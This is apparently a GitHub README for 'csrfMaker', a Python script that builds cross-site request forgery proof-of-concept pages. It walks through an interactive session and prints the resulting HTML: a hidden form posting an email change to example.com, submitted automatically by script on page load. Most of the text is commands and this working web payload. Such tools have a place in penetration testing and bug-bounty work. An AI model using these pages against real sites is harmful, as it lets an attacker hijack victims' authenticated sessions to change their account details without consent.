# csrfMaker

## overview
very basic python script for creating csrf html pages

## Installation
the script hasn't any third party dependency so you can esaily clone and run the code :
```sh
> git clone https://github.com/theN0b0dy/csrfMaker.git
> cd csrfMaker
```

## Usage
the script hasn't any third party dependency so you can esaily run the code :
```sh
> ./csrfMaker
Enter the action url for your form : https://example.com/change-email
Enter Form id (default: form) :
Enter the Method (GET,POST,PUT,DELET, ... default:POST ) :
Enter the name of your 1 input form(enter done for break) : email
Enter the value of your 1 input form : test@email.com
Enter the type of your 1 input form (default: hidden) :
Enter the id of your 1 input form (default: [your_input_name]) :
Enter the name of your 2 input form(enter done for break) : csrf
Enter the value of your 2 input form :
Enter the type of your 2 input form (default: hidden) :
Enter the id of your 2 input form (default: [your_input_name]) :
Enter the name of your 3 input form(enter done for break) : done
Enter your script(defualt:[just submit the form] :
Enter the name of your html template(default: csrf.html) : example.html
your example.html succesfully created.
```
the output file is :
```html
<html>
	<form action='https://example.com/change-email' method='POST' id='form'>
		<input type='hidden' name='email' value='test@email.com' id='email'/>
		<input type='hidden' name='csrf' value='' id='csrf'/>
	</form>
	<script>document.getElementById('form').submit();</script>
</html>
```
